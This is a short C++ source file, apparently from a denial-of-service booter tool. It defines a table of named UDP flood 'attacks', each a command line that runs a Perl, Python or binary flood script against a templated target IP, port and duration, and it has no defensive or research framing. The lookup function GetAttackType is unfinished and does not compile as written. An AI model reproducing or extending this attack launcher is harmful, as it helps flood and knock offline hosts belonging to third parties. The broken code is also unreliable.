#include "attack.h"
#include "attacktype.h"
#include <vector>

namespace Attacks {
	static std::vector<AttackType> AttackTypes = {
		{ "UDP1",		"perl udp1.pl {{ip}} {{port}} 0 {{time}}" },
		{ "UDP2",		"python3 udp2.py {{ip}} {{port}} {{time}}"},
		{ "UDP3",		"perl udp3.pl --port={{port}} --time={{time}} {{ip}}"},
		{ "UDP4",		"perl udp4.pl {{ip}} {{port}} 30000 {{time}}"},
		{ "VGBOOT",		"perl VGBoot.pl {{ip}} {{port}} 30000 {{time}}"},
		{ "GOTT",		"./gott -i {{ip}} -p {{port}} -s 30000 -t {{time}}"},
		{ "NYTRO",		"perl nytro.pl {{ip}} {{port}} 30000 {{time}}"},
		{ "JUUL",		"perl juul.pl {{ip}} {{port}} 0 {{time}} 100"}
	};
	AttackType GetAttackType(std::string name)
	{
		
		for (AttackType type : AttackTypes) {
			if(std::tolower)
		}
	}
}


//TODO: Make a new class for each attack so input can be changed and shit